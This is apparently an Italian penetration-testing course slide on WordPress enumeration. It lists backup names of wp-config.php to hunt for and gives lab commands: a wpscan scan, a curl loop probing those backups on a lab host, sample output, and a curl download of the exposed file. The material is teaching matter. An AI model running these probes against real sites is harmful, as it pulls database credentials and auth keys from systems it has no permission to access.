Capitolo 2: WordPress Enumeration

Slide 2.7: Configuration File Exposure
Teoria: I File che non Dovresti Vedere

Durante sviluppo o manutenzione, gli admin spesso creano backup dei file di configurazione. Questi possono rimanere esposti.


File critici da cercare:

  • wp-config.php.bak
  • wp-config.php.old
  • wp-config.php.save
  • wp-config.php~ (vim backup)
  • wp-config.php.swp (vim swap)
  • .wp-config.php.swp
  • wp-config.txt

Security Insight: wp-config.php contiene credenziali DB, chiavi di autenticazione e salt. Un backup esposto = compromissione totale.

Lab: Ricerca File Sensibili

WPScan Config Backup:

┌──(kali㉿kali)-[~] └─$ wpscan --url http://vulnerable-wp.local -e cb

Ricerca manuale con curl:

└─$ for ext in bak old save txt swp ~; do curl -s -o /dev/null -w "%{http_code} wp-config.php.$ext\n" \ http://vulnerable-wp.local/wp-config.php.$ext done

Output:

404 wp-config.php.bak 200 wp-config.php.old ← TROVATO! 404 wp-config.php.save 404 wp-config.php.txt 404 wp-config.php.swp

Scaricare il file:

└─$ curl http://vulnerable-wp.local/wp-config.php.old
